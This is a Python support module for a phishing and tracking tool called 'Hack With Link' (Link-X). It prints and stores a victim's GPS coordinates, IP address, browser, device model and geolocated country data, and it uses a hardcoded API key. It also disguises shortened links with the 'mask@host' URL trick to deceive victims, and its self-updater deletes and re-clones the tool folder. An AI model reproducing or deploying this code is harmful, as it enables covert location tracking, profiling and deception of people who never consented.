# Some More Needed Codes For The Tool

import shutil
import time
import os
import sys
import json
import requests
import gdshortener

s = gdshortener.ISGDShortener()


columns = shutil.get_terminal_size().columns

def psb(z):
    for p in z + "\n":
        sys.stdout.write(p)
        sys.stdout.flush()
        time.sleep(0.02)


##Logo##
def logo():
    os.system("clear")
    print("\033[94m┌────────────────────────────────────────┐".center(columns+4))
    print("\033[94m│           \033[92m▌  ▗    ▌       ▌ ▌\033[94m          │".center(columns+14))
    print("\033[94m│           \033[92m▌  ▄ ▛▀▖▌▗▘ ▄▄▖ ▝▞ \033[94m          │".center(columns+14))
    print("\033[94m│           \033[92m▌  ▐ ▌ ▌▛▚      ▞▝▖\033[94m          │".center(columns+14))
    print("\033[94m│           \033[92m▀▀▘▀▘▘ ▘▘ ▘     ▘ ▘\033[94m          │".center(columns+14))
    print("\033[94m│                              \033[94m          │".center(columns+8))
    print("\033[94m│ \033[95mAuthor : ToxicNoob                     \033[94m│".center(columns+14))
    print("│ \033[95mTool   : Hack With Link                \033[94m│".center(columns+8))
    print("│ \033[95mGitHub : https://github.com/Toxic-Noob \033[94m│".center(columns+8))
    print("│ \033[95mCoder  : HunterSl4d3             \033[37mV1.0  \033[94m│".center(columns+14))
    print("\033[94m└────────────────────────────────────────┘".center(columns+4))

#SavingData#
def save_data(data):
    file = open(".server/upload/data.json", "r").read()
    file_out = open(".server/upload/data.json", "w")
    file_out.write(file+str(data))
    file_out.close()


#VictimLocationPrint#
def print_location(data):
    dt = json.loads(data)["info"]
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Latitude : \033[37m"+dt["lat"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Longitude : \033[37m"+dt["lon"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Accuracy : \033[37m"+dt["acc"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Altitude : \033[37m"+dt["alt"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Heading : \033[37m"+dt["dir"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Speed : \033[37m"+dt["spd"])


#DeviceInfoPtinting#
def print_details(data):
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Please Wait, Processing Data...")
    dt = json.loads(data)["info"]
    
    ip = dt["ip"]
    
    try:
        ip_data = requests.get("http://api.ipapi.com/"+ip+"?access_key=f786cc3991317e418e2bd0bb82223943", timeout=4).text.replace("[", "").replace("]", "")
        ip_data = json.loads(ip_data)
        continent = ip_data["continent_name"]
        country_code = ip_data["country_code"]
        country_name = ip_data["country_name"]
        capital = ip_data["location"]["capital"]
        language = ip_data["location"]["languages"]["name"]
        call_code = ip_data["location"]["calling_code"]
        save_data(ip_data)
    except:
        pass
    
    try:
        ip_data2 = requests.get("https://ipapi.co/"+ip+"/json/", timeout=4).text
        ip_data2 = json.loads(ip_data2)
        tdl = ip_data2["country_tld"]
        currency = ip_data2["currency_name"]
        time_zone = ip_data2["utc_offset"]
        org = ip_data2["org"]
        save_data(ip_data2)
    except:
        pass
    
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m IP Address : \033[37m"+dt["ip"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Cookie : \033[37m"+dt["cookie"].replace("true", "enabled").replace("false", "disabled").title())
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m User Agent : \033[37m"+dt["ua"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Platform : \033[37m"+dt["platf"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Browser Language : \033[37m"+dt["lang"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Screen Width : \033[37m"+dt["wid"])
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Screen Hight : \033[37m"+dt["hig"])
    dev_data = dt["dname"]
    dev_data = dev_data.split(" ")
    dev_name = dev_data[0]+" "+dev_data[2]
    dev_mod = dev_data[1]
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Device Name : \033[37m"+dev_name)
    print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Device Model : \033[37m"+dev_mod)
    try:
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Continent : \033[37m"+continent)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Country Code : \033[37m"+country_code)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Country Name : \033[37m"+country_name)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Capital : \033[37m"+capital)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Language : \033[37m"+language)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Calling Code : \033[37m"+call_code)
    except:
        pass
    try:
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Country TDL : \033[37m"+tdl)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Currency Name : \033[37m"+currency)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m Time Zone : \033[37m"+time_zone)
        print("\n\033[92m    \033[94m[\033[37m+\033[94m]\033[92m ORG : \033[37m"+org)
    except:
        pass


#MaskURL
def mask_url(url, mask):
    short = str(s.shorten(url)[0])
    
    mask = mask.replace(" ", "-").replace("https://", "").replace("http://", "").replace("/", "-").replace("?", "")
    
    head = "https://"
    
    tail = short.replace("https://", "").replace("http://", "")
    
    masked = head+mask+"@"+tail
    
    return masked



#ToolUpdate#

def chk():
    try:
        main_ver = requests.get("https://raw.githubusercontent.com/Toxic-Noob/Link-X/main/lib/.version").text
    except:
        psb("\n\033[91m    [!] Please Turn On Your Internet Connection!")
        time.sleep(1)
        l = input("\n\033[92m    [*] Press Enter To Countinue...")
        chk()
    chk.ver = main_ver


def update():
    psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Please Wait, Checking Update...")
    try:
        tool_ver = open("lib/.version", "r").read()
    except:
        tool_ver = "ToxicNoob"
    chk()
    main_ver = chk.ver
    
    if not (tool_ver == main_ver):
        psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Tool Update Found!")
        psb("\n\033[92m    [\033[91m!\033[92m] Backup Your Hacked Datas. Because After Tool Update, All Data Will Be Eresed...")
        time.sleep(1)
        l = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Press Enter To Update Tool...\033[37m")
        psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Updating Tool...")
        time.sleep(1)
        os.system("cd .. && rm -rf Link-X && git clone https://github.com/Toxic-Noob/Link-X > /dev/null 2>&1")
        psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Tool Updted Successfully...")
        psb("\n    \033[94m[\033[37m*\033[94m]\033[92m Starting Tool...")
        time.sleep(1)
        os.system("cd .. && cd Link-X && python link-x.py")
    else:
        psb("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m You Are Using The Latest Version Of Link-X...")
        psb("\n    \033[94m[\033[37m*\033[94m]\033[92m Thanks For Using Our Tool..")
        l = input("\n\033[92m    \033[94m[\033[37m*\033[94m]\033[92m Press Enter To Countinue...\033[37m")
        os.system("python ")
    

#ToolExitMassage#
def logout():
    psb("\n\033[92m    \033[94m[💓\033[94m]\033[92m Thanks For Using Our Tool...")
    psb("\n\033[92m    \033[94m[💓\033[94m]\033[92m For More Tools, Visit...\n")
    print("\033[93m[ \033[94mhttps://github.com/Toxic-Noob \033[93m] \033[37m\n".center(columns+18))
    time.sleep(0.8)
    sys.exit()
